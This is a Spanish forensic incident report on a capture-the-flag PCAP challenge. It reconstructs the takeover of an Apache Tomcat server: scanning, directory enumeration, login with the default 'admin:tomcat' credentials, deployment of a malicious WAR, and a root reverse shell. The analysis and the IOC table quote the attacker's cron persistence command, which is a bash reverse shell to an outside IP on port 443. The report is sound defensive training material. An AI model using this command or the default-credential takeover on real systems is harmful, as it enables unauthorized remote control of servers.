# CASO 02 — Compromiso de un servidor Apache Tomcat

| | |
|---|---|
| ID | CASE-CD-TT-002 |
| Severidad | Crítica (P1) |
| Estado | Cerrado — Verdadero Positivo |
| Plataforma | Wireshark — análisis forense de PCAP |
| Dataset | CyberDefenders — *Tomcat Takeover* (21.070 paquetes, ~1,9 MB) |
| Frameworks | MITRE ATT&CK v15 · NIST SP 800-61 Rev. 2 |

Compromiso multifase de un Tomcat en la intranet corporativa, que reconstruí sin SIEM
y sin logs de endpoint: solo a partir del tráfico de red capturado.

## 1. Alerta recibida

El SOC detecta un servidor web de la intranet haciendo conexiones salientes a IPs
sospechosas. Se captura el tráfico para análisis forense.

## 2. Triaje

### Jerarquía de protocolos

21.070 paquetes. TCP domina con ~21K, la mayoría sin protocolo de aplicación —firma
clásica de un escaneo SYN—. Por debajo: HTTP (258), SSH (588) y SMB2 (104).

### Conversaciones IPv4

`14.0.0.120` → `10.0.0.112`: 19.607 paquetes, el 93 % del tráfico total. El resto son
IPs internas con volumen residual.

Decido verdadero positivo, prioridad P1. Atacante `14.0.0.120`, víctima `10.0.0.112`.

## 3. Análisis de tráfico

### 3.1 Escaneo de puertos

```
ip.src == 14.0.0.120 && tcp.flags.syn == 1 && tcp.flags.ack == 0
```

9.447 paquetes SYN barriendo puertos secuencialmente. La mayoría reciben RST.

El filtro complementario revela qué respondió:

```
ip.src == 10.0.0.112 && tcp.flags.syn == 1 && tcp.flags.ack == 1
```

Solo tres puertos abiertos: 22 (SSH, 917 paquetes), 8009 (AJP, 3 paquetes) y 8080
(Tomcat, 1.127 paquetes), el más activo y el vector del ataque.

Enriquecimiento (AbuseIPDB): `14.0.0.120` → CHINANET Guangdong, Shenzhen, China. Data
center / hosting, dominio `chinatelecom.cn`.

### 3.2 Enumeración de directorios

```
ip.src == 14.0.0.120 && http.request.method == "GET" && http.request.uri contains "/"
```

El tráfico HTTP tiene dos fases que distingo por el User-Agent:

| Fase | t (s) | User-Agent | Comportamiento |
|---|---|---|---|
| Navegación manual | ~372 | `Firefox/115.0` | Recursos legítimos: `/`, `tomcat.css`, `tomcat.png` |
| Enumeración | ~386 | `gobuster/3.6` | Ráfaga contra `/admin`, `/docs/`, `/manager/html`… |

```
ip.src == 14.0.0.120 && http.request.uri contains "manager"
```

Gobuster descubre `/host-manager`, `/manager/html`, `/manager/deploy`, `/manager/install`
y `/manager/jmxproxy`. El objetivo es `/manager/html`.

### 3.3 Fuerza bruta de credenciales

```
ip.src == 14.0.0.120 && http.authorization
```

Nueve peticiones con cabecera `Authorization`: 6 intentos contra `/manager/html`, 2
cargas de imágenes tras el login y 1 POST de subida.

El paquete 20553 contiene el acceso exitoso:

```
Authorization: Basic YWRtaW46dG9tY2F0
→ admin:tomcat
```

Credenciales por defecto de Apache Tomcat.

Un detalle de atribución: en esta fase el User-Agent vuelve a ser Firefox, no Gobuster.
El atacante abandona la herramienta automatizada y prueba a mano. Hay un operador humano
detrás, no un bot desatendido.

### 3.4 Despliegue del reverse shell

Paquete 20616 — `POST /manager/html/upload`:

| Campo | Valor |
|---|---|
| Content-Type | `multipart/form-data` |
| Campo | `deployWar` |
| Fichero | `JXQOZY.war` |
| Tamaño | 1.083 bytes |

Un WAR es el formato estándar de despliegue de Tomcat. El atacante no explota ninguna
vulnerabilidad: usa la funcionalidad legítima del Manager para desplegar su reverse
shell como si fuera una aplicación más.

### 3.5 Post-explotación y persistencia

```
ip.addr == 14.0.0.120 && tcp && frame.number > 20616 && !http
```

Aparece una conexión TCP desde el servidor hacia el atacante —inversión del sentido
habitual, firma de reverse shell—.

Follow TCP Stream (stream 9461):

```bash
whoami
→ root

cd /tmp
pwd
→ /tmp

echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/14.0.0.120/443 0>&1'" > cron
crontab -i cron
crontab -l
→ * * * * * /bin/bash -c 'bash -i >& /dev/tcp/14.0.0.120/443 0>&1'
```

El atacante confirma que es root y planta un cron que se reconecta cada minuto al puerto
443. La elección del puerto no es casual: un firewall que filtre por puerto ve tráfico
HTTPS saliente y lo deja pasar.

## 4. Mapeo MITRE ATT&CK

| Táctica | Técnica | ID |
|---|---|---|
| Reconnaissance | Active Scanning: Scanning IP Blocks | [T1595.001](https://attack.mitre.org/techniques/T1595/001/) |
| Discovery | Network Service Discovery | [T1046](https://attack.mitre.org/techniques/T1046/) |
| Credential Access | Brute Force: Password Guessing | [T1110.001](https://attack.mitre.org/techniques/T1110/001/) |
| Initial Access | Valid Accounts: Default Accounts | [T1078.001](https://attack.mitre.org/techniques/T1078/001/) |
| Execution | Command and Scripting Interpreter: Unix Shell | [T1059.004](https://attack.mitre.org/techniques/T1059/004/) |
| Persistence | Scheduled Task/Job: Cron | [T1053.003](https://attack.mitre.org/techniques/T1053/003/) |
| Persistence | Server Software Component: Web Shell | [T1505.003](https://attack.mitre.org/techniques/T1505/003/) |
| Command and Control | Application Layer Protocol: Web Protocols | [T1071.001](https://attack.mitre.org/techniques/T1071/001/) |

## 5. Veredicto

Compromiso confirmado. Cadena completa:

```
Escaneo de puertos (9.447 SYN)
   → Enumeración con gobuster/3.6
   → Fuerza bruta → admin:tomcat (credenciales por defecto)
   → Despliegue de JXQOZY.war vía Tomcat Manager
   → Reverse shell como root
   → Persistencia: cron cada minuto al puerto 443
```

## 6. Contención recomendada

1. Aislar el servidor de la red para cortar el canal C2.
2. Bloquear `14.0.0.120` en el perímetro, entrada y salida.
3. Eliminar el cron malicioso y el WAR desplegado.
4. Cambiar las credenciales del Manager; nunca las de por defecto.
5. Restringir el acceso al Manager por IP o VPN.
6. Revisar el resto de la intranet por movimiento lateral: el atacante tenía root.
7. Monitorizar conexiones salientes desde servidores que no deberían iniciarlas.

## 7. Lecciones aprendidas

- Credenciales por defecto. `admin:tomcat` es la primera combinación de cualquier
  diccionario contra Tomcat. Seis intentos bastaron.
- Panel de administración expuesto, sin restricción por IP ni MFA.
- Sin rate-limiting: nada frenó los intentos sucesivos.
- Sin monitorización de salida. El reverse shell al 443 pasó desapercibido porque nadie
  vigilaba qué conexiones iniciaba el servidor.
- Tomcat corriendo como root. El atacante obtuvo el máximo privilegio sin necesidad de
  escalar. Un servicio web no necesita ser root.

## 8. IOCs

| IOC | Tipo |
|---|---|
| `14.0.0.120` | IP atacante (CHINANET, Shenzhen) |
| `10.0.0.112` | Servidor comprometido |
| `JXQOZY.war` | WAR malicioso (reverse shell) |
| `admin:tomcat` | Credenciales por defecto comprometidas |
| `/manager/html` | Panel accedido |
| `* * * * * /bin/bash -c 'bash -i >& /dev/tcp/14.0.0.120/443 0>&1'` | Cron de persistencia |
| `gobuster/3.6` | User-Agent de enumeración |

---

## Reproducir el caso

Challenge gratuito de [CyberDefenders — Tomcat Takeover](https://cyberdefenders.org/blueteam-ctf-challenges/tomcat-takeover/).
Requiere Wireshark. Instrucciones en [`../docs/lab-setup.md`](../docs/lab-setup.md).
